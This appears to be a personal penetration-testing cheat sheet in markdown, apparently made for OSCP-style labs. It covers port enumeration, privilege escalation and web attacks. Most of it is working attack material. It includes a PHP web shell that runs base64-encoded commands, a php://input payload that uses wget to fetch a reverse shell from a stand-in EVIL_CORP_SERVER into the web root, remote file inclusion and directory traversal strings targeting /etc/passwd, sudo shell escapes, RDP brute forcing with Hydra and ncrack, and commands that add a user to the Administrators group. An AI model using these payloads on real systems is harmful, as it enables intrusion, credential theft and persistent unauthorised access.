<h1>PWNAGE CHECKLIST</h1>
<h2>Basic things I forget to check.</h2>
<h3>Links at the bottom provides all of the summary I made here, **BUY RTFM**</h3>

- establish vpn connectivity / confirm connectivity
- check my ip
- Scan target network
  - basic ping sweep on large range
  - select target, make note of ip in evernote
  - document everything
- Wireshark
  - Set to specific interface
  - Check how requests being handled
  - Htmlentities / escaping / str replace
  - tcp connect success or resets
  - Responses from cli connect attempts
  - Filtering
	  - ``` ip-addr==192.192.192.192 ```
- NMAP
  - ```nmap -sC -sV -O -A -T2/3 IP-TARGET -v ``` (Overboard scan)
  - ```nmap --source-port 67 --spoof-mac Cisco --script safe -p80,443 -T3 Target_IP -vv```
  - ```nmap -sU -T3 Ip-target -v ``` (Can take forever)
  - ```--source-port 53/67``` (DNS or DHCP)
  - ```nmap --script safe Target -vv```

- Port 21
  - Banner grabbing
	  -```ftp root@ip-target```
	- Try anonymous login
	- Set to **BINARY** for exe
	- PUT / DELETE / GET
	- Check for version numbers
	- use searchsploit / google for known vulns

- Port 22
  - Banner grabbing / check username
	  - ```ssh root@192.192.192.192```

- Ports 139, 445
  - nmap enumerate if possible with scripts if nothing came up before. perhaps change scan speed to slower one
  - enum4linux
  - smbclient ```smbclient \\\\ip\\share```
  - try to connect to them to see if they are truly alive
  - Banner grabbing even if booted
  - ```nbtscan [ip-range]``` (https://highon.coffee/blog/nbtscan-cheat-sheet/)

- Port 161 (snmp)
  - ```snmpwalk -c public -v 1 $IP 1.3.6.1.4.1.77.1.2.25```
  - ```snmp-check $IP```
  - ```onesixtyone $IP```

- Port 80 / 443 open
  - iis info
	  - 1.0	Windows NT Server 3.51
	  - 2.0	Windows NT Server 4.0
	  - 3.0	NT Server 4.0 Service Pack 3 (Internet Information Server 2.0 is automatically upgraded to Internet Information Server 3.0 during the install of SP3).
	  - 4.0	Windows NT Server 4.0 SP3 and Microsoft Internet Explorer 4.01
	  - 5.0	Windows 2000
	  - 5.1	Windows XP Professional
	  - 6.0	WIndows Server 2003
	  - 7.0	Windows Vista and WIndows Server 2008
	  - 7.5	Windows 7 and Windows Server 2008 R2
	  - 8.0	Windows 8 and Windows Server 2012
  - ```nikto -host ip-target -evasion 8``` (Many others check -H)
  - ```nikto -host 10.11.1.227 -evasion 7``` (Change URL case)
  - ```dirb http://Ip-target -r``` **Different wordlist perhaps**
        - Non-recursive to save time, then inspect further if necessary
  - Try nmap ``` -–script=http-enum.nse``` (others available)
  	- ```nmap -T4 --script safe -p80,443 Target_IP -vv```
  - Check site in browser (http/https)
  - Resolve host name if necessary (etc/hosts)
  - Cookies
  - GET POST
  - Check source
	  - Directories
	  - Comments
	  - Script links
	  - Form methods
	  - Login forms
		  - Versions/names/brands etc
		  - Basic sql injection
        - ``` ‘or 1=1```
        - ```union```
- Port 3389
  - ```rdesktop -z Target_IP:PORT```
  - Screen shot login screen
  - ```ncrack -vv --user admin -P password-file.txt rdp://192.168.1.1```
  - ```rdp-enum-encryption.nse rdp-vuln-ms12-020.nse```
   
<H2>Linux</H2>

- Low priv 
  - find writeable directories if /tmp or /dev/shm not available
	  - ```find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;```
  - netcat 
   	- ```>``` output to a file
   	- ```nc -nv target-ip port < filename``` (send from kali)
  - upgrade linux shell
	- ```echo os.system('/bin/bash')```
	- ```/bin/sh -i```
   	- ```python -c “import pty; pty.spawn(‘/bin/bash’)”```
		- ctrl+z backgrounds the shell on local box
		-then type:
		  - ```ssty raw -echo```
			- ```fg```
			- ```reset```
			- if size is an issue type:
			  - ```stty size``` (returns current window size)
				- ```stty -rows 48 -columns 120``` (eg size)
- Priv esc linux
  - try ```sudo su``` or ```sudo -l```
	- If ```find``` has sudo ```sudo find /home -exec sh -i \;```
	- ```sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"``` (https://v3ded.github.io/ctf/zico2.html)
	- if these don’t work try get kernel and distro info to look for exploits
	  - ```uname -ar```
		- ```cat /etc/issue```
		- ```cat /etc/*-release```
		- ```cat /etc/lsb-release```
		- ```cat /etc/redhat-release```
  - SUID
	  - ```find / -perm -u=s -type f 2>/dev/null ```
          - ```nmap --interactive``` then ```!sh``` (Have yet to be lucky enough to find this, much older versions only)
  - Available programs/languages on host:
	  - which Perl,python etc
  - Transfer Files
	  - Nc,ncat,wget,curl
	    - ```curl -o theFile http://IP:PORT/theFile```
	    - ```curl ftp://ftp.domain.com --user username:password```
	        - Access FTP server (Add file to end of domain to download)
	    - ```wget http://IP:PORT/theFile -O theFile```
	    - ```fetch -o theFile http://IP:PORT/theFile``` (FreeBSD)
  - Password Files
	  - /etc/pwd.db
		- /etc/spwd.db
		- /etc/shadow
		- /etc/passwd

<H2>Windows</H2>

  - Usefull commands
    - ```ver```
    - ```dir /a```
    - ```type```
    - ```ipconfig -all```
    - ```echo %HOSTNAME% && %USERNAME%```
    - ```systeminfo```
    - ```net users```
    - ```dir /s *pass* == *cred* == *vnc* == *.config*```
    - ```net start upnphost``` (or other service)
    - ```sc query state=all``` (Show services)
    - ```net user jeff password123 /add```
    - ```net localgroup "Administrators"``` (List admins)
    - ```net localgroup "Administrators" user /add``` (Add user to admin)

 - Priv esc
   - Still busy gathering info... Have this so far:
   - ```cacls C:\WINDOWS\system32\``` This displays permissions on folder & same for file eg: cacls test.txt
   - icacls for newer Windows versions (I think Vista upwards)

<H2>Getting In</H2>

- Put this at top because its handy as balls
  - ```<?php if(isset($_REQUEST["cli"])){ echo "<pre>"; $cli = base64_decode(urldecode(($_REQUEST["cli"]))); system($cli); echo "</pre>"; die; }?>```
  - url request must be encoded in base64 prior.
	- ```http://target?cli=%22bHMgLWxhIC92YXIvdG1wLw==%22```
- Passwords
  - Hydra
        - ```hydra -l admin -P /Passwords.txt Target_Ip rdp```
  
- Remote file inclusion (https://sushant747.gitbooks.io/total-oscp-guide/remote_file_inclusion.html)
  - Similar to local file inclusion while not hosted on the target
	- Rarer than LFI due to php.ini needs to configured for it
	- Requres unsanitised parameter:
	  - ```$theFile = $_REQUEST[“file”];```
		- ```include($theFile . “.php”);```
	- Now in browser:
	  - ```http://192.192.192.192/index.php?page=http://naughty.com/badfile.txt```
		- Badfile.txt:
		  - ```<?php echo shell_exec("whoami");?>```
- LFI (https://highon.coffee/blog/lfi-cheat-sheet/)
- Manipulate files
  - ```http://Target-site/cgi-bin/main.cgi?file=main.cgi```
  	- Show source of main.cgi
- Directory traversal and Server side tricks
  - ```http://testsite.com/get.php?f=/var/www/html/get.php```
  - ```http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc```
  - ```http://testsite.com/get.asp?f=/etc/passwd```
	- Note above errors for clues on file locations etc....
  - ```foo.php?file=../../../../../../../etc/passwd```
  - PHP ```expect:``` #Not enabled by default, uses expect wrapper to execute commands
  	- ```http://127.0.0.1/fileincl/example1.php?page=expect://ls```
  - PHP (POST request) ```php://input```
	- ```http://192.168.183.128/fileincl/example1.php?page=php://input```
	  - input can be:
		- ```<? system('wget http://EVIL_CORP_SERVER/php-reverse-shell.php -O /var/www/shell.php');?>```
		- In browser:
		  - ```http://Target_IP/shell.php```
  - PHP ```php://filter```
	- ```http://Target_IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd```
	- Must decode the output from base64
	- ```/proc/self/environ``` (If you able to write there)
- Manipulate ```User Agent``` in Burp
- phpinfo()
  - https://highon.coffee/blog/lfi-cheat-sheet/#fimap--phpinfo-exploit
	- Uses phpinfo() to write temporary files together with fimap
- WAF
  - wafw00f http://example.com
  
- Transferring files & Uploads
  - Upload bypass restrictions
	  - ```?file=secret.doc%00.pdf```	  
  - I prefer SimpleHTTPServer to see active transfers
	  - ```python -m SimpleHTTPServer 443``` 

**usefull links**
- https://netsec.ws/?p=331 (msfvenom,shells,tips)
- https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
- https://sushant747.gitbooks.io/total-oscp-guide/connections.html
- http://www.fuzzysecurity.com/tutorials/16.html (Windows Priveledge Escalation tips)
- https://payatu.com/guide-linux-privilege-escalation/ (Linux Privesc)
- https://www.owasp.org/index.php/Path_Traversal  (Topics about everything)
- https://crackstation.net/
- https://github.com/Re4son/Churrasco

**Awesome books**
- RTFM (Red Team Field Manual)


